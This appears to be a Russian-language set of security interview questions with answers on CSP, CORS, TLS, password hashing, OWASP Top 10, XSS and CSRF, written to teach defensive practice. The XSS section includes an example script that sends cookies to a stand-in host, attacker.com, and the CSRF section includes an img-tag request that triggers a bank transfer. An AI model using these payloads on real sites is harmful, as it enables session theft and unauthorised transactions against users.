# Вопросы для собеседования по Security

## Content Security Policy (CSP)

<details>
<summary><b>Что такое Content Security Policy (CSP)?</b></summary>

CSP — это фича безопасности браузера. Она контролирует какие scripts, styles и ресурсы разрешено загружать через HTTP headers. Это помогает защитить сайты от атак типа XSS. Пример: `Content-Security-Policy: script-src 'self'` разрешает только скрипты с того же origin.
</details>

## CORS

<details>
<summary><b>Что такое CORS?</b></summary>

CORS (Cross-Origin Resource Sharing) — это браузерное правило, контролирующее запросы между разными сайтами. Сервер решает какие origins разрешены через header `Access-Control-Allow-Origin`. Это помогает предотвратить несанкционированный доступ к данным. Preflight requests (`OPTIONS`) проверяют разрешения заранее.
</details>

## SSL / TLS

<details>
<summary><b>Что такое SSL/TLS Handshake?</b></summary>

Этот процесс создаёт безопасное соединение между клиентом и сервером. Шаги: client hello → server hello + сертификат → обмен ключами → установлена зашифрованная сессия. Он проверяет идентичность сервера и устанавливает ключи шифрования. После handshake все данные передаются безопасно (HTTPS).
</details>

## Logging

<details>
<summary><b>Что такое базовый logging и почему он важен для безопасности?</b></summary>

Запись событий приложения. Важность для безопасности: обнаружение атак, аудит действий пользователей, расследование инцидентов, требования compliance. Логируйте: попытки авторизации, ошибки, доступ к чувствительным данным. Не логируйте: пароли, токены, PII. Используйте structured logging (JSON).
</details>

## npm Audit

<details>
<summary><b>Что такое npm audit и как его использовать?</b></summary>

Встроенная npm команда, проверяющая зависимости на известные уязвимости. Запуск: `npm audit`. Исправление: `npm audit fix`. Показывает: severity уязвимости, affected package, доступен ли fix. Запускайте регулярно, включите в CI. Также: Snyk, Dependabot для автоматических проверок.
</details>

## Чувствительные данные

<details>
<summary><b>Как вы обрабатываете чувствительные данные в приложениях?</b></summary>

- Храните в environment variables, не в коде
- Используйте secrets management (Vault, AWS Secrets Manager)
- Шифруйте at rest и in transit (HTTPS)
- Минимизируйте сбор данных
- Маскируйте в логах и UI
- Контроль доступа (кто что может видеть)
- Безопасное удаление когда не нужны
</details>

## Encryption и Hashing

<details>
<summary><b>В чём разница между encryption и hashing?</b></summary>

- **Encryption**: Обратимое с ключом. Двусторонняя. Используется для данных, которые нужно прочитать позже
- **Hashing**: Односторонняя, необратимая. Один и тот же вход = один и тот же выход. Используется для верификации
</details>

<details>
<summary><b>Когда использовать encryption vs hashing?</b></summary>

- **Hashing**: Пароли, проверка целостности данных, checksums
- **Encryption**: Хранение чувствительных данных, защищённая коммуникация, данные, которые нужно извлечь

Пароли: всегда hash, никогда encrypt.
</details>

<details>
<summary><b>Какие распространённые алгоритмы шифрования?</b></summary>

- **Symmetric** (один ключ): AES (рекомендуется), DES (устарел)
- **Asymmetric** (public/private keys): RSA, ECDSA
- **Hashing**: bcrypt (пароли), SHA-256, Argon2

Используйте established библиотеки, не реализуйте сами.
</details>

## Безопасность паролей

<details>
<summary><b>Как безопасно хранить пароли?</b></summary>

Никогда не храните plain text. Хэшируйте с bcrypt, Argon2 или scrypt. Используйте salt (уникальный для каждого пароля, хранится с хэшем). Используйте высокий work factor (медленно = сложнее brute force). Никогда: MD5, SHA1, unsalted hashes.
</details>

## Security Audits

<details>
<summary><b>Как провести базовый security audit?</b></summary>

Проверьте: зависимости (npm audit), HTTPS везде, валидация input, authentication/authorization, обработка ошибок (без чувствительной информации), security headers, CORS config, environment variables. Используйте OWASP checklist. Рассмотрите penetration testing.
</details>

## OWASP

<details>
<summary><b>Что такое OWASP?</b></summary>

Open Web Application Security Project. Non-profit, предоставляющий: security guidelines, инструменты, документацию. Известен OWASP Top 10 — самые критичные риски безопасности web. Бесплатные ресурсы для разработчиков и security professionals.
</details>

<details>
<summary><b>Можете объяснить уязвимости OWASP Top 10?</b></summary>

Top risks (2021):
1. **Broken Access Control**: Несанкционированные действия
2. **Cryptographic Failures**: Слабое шифрование, открытые данные
3. **Injection**: SQL, XSS, command injection
4. **Insecure Design**: Отсутствие безопасности в архитектуре
5. **Security Misconfiguration**: Default configs, лишние фичи
6. **Vulnerable Components**: Устаревшие зависимости
7. **Authentication Failures**: Слабые пароли, проблемы с сессиями
8. **Data Integrity Failures**: Небезопасная десериализация
9. **Logging Failures**: Отсутствие audit trails
10. **SSRF**: Server-side request forgery
</details>

## Common Vulnerabilities

<details>
<summary><b>Как предотвратить распространённые уязвимости безопасности (XSS, CSRF, SQL Injection)?</b></summary>

- **XSS**: Escape output, используйте CSP headers, санитизируйте HTML input, React escape по умолчанию
- **CSRF**: Используйте CSRF tokens, SameSite cookies, проверяйте Origin header
- **SQL Injection**: Используйте parameterized queries/prepared statements, никогда не конкатенируйте user input в queries, используйте ORM

Общее: валидируйте весь input, принцип наименьших привилегий, держите зависимости обновлёнными.
</details>

## XSS (Cross-Site Scripting)

<details>
<summary><b>Что такое XSS и какие его типы?</b></summary>

XSS позволяет атакующим внедрять вредоносные скрипты в веб-страницы, просматриваемые другими пользователями. Три основных типа:

- **Stored XSS**: Вредоносный скрипт постоянно хранится на целевом сервере (база данных, комментарии). Выполняется когда пользователи загружают страницу. Наиболее опасный
- **Reflected XSS**: Скрипт отражается от web server (результаты поиска, сообщения об ошибках). Требует от жертвы клика по вредоносной ссылке
- **DOM-based XSS**: Уязвимость существует в client-side коде. Скрипт модифицирует DOM без участия сервера. Сложнее обнаружить

Пример атаки: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
</details>

<details>
<summary><b>Как защититься от XSS атак?</b></summary>

- **Escape output**: Конвертируйте `<`, `>`, `&`, `"`, `'` в HTML entities
- **Используйте CSP headers**: Ограничивайте источники скриптов через `Content-Security-Policy`
- **Санитизируйте HTML input**: Используйте библиотеки типа DOMPurify для user-generated HTML
- **Используйте HTTPOnly cookies**: Предотвращает JavaScript доступ к чувствительным cookies
- **Защита фреймворков**: React, Vue, Angular escape по умолчанию — избегайте `dangerouslySetInnerHTML`
- **Валидируйте input**: Отклоняйте или санитизируйте неожиданные символы
</details>

## CSRF (Cross-Site Request Forgery)

<details>
<summary><b>Что такое CSRF и как это работает?</b></summary>

CSRF обманывает авторизованных пользователей, заставляя выполнять нежелательные действия. Атакующий создаёт вредоносную страницу, которая делает запросы к целевому сайту, используя credentials жертвы (cookies отправляются автоматически).

Пример: Пользователь залогинен в банке. Страница атакующего содержит: `<img src="https://bank.com/transfer?to=attacker&amount=1000">`. Браузер отправляет запрос с cookies пользователя.

Требования для CSRF: пользователь должен быть авторизован, предсказуемые параметры запроса, нет дополнительной верификации.
</details>

<details>
<summary><b>Как защититься от CSRF атак?</b></summary>

- **CSRF tokens**: Включайте уникальный, непредсказуемый токен в формы. Сервер проверяет соответствие токена сессии
- **SameSite cookies**: Установите `SameSite=Strict` или `SameSite=Lax` для предотвращения cross-origin отправки cookies
- **Проверяйте Origin/Referer headers**: Проверяйте что запрос пришёл с вашего домена
- **Double submit cookies**: Отправляйте CSRF token и в cookie и в теле запроса
- **Требуйте re-authentication**: Для чувствительных действий (смена пароля, денежный перевод)

Современные фреймворки (Django, Rails, Express с csurf) предоставляют встроенную CSRF защиту.
</details>

<details>
<summary><b>В чём разница между XSS и CSRF?</b></summary>

| Аспект | XSS | CSRF |
|--------|-----|------|
| Тип атаки | Выполняет вредоносный JS | Отправляет нежелательный запрос |
| Выполнение кода | В браузере жертвы | JS не нужен |
| Контроль | Полный контроль DOM | Использует доверие к cookies |
| Цель | Атакует пользователя | Атакует сервер через пользователя |

**XSS**: Атакующий выполняет произвольный JavaScript в браузере жертвы через доверенный сайт.

**CSRF**: Атакующий обманывает браузер отправить запрос к доверенному сайту, используя существующую авторизацию жертвы.

Ключевое различие: XSS внедряет и выполняет код, CSRF эксплуатирует существующую авторизацию.
</details>
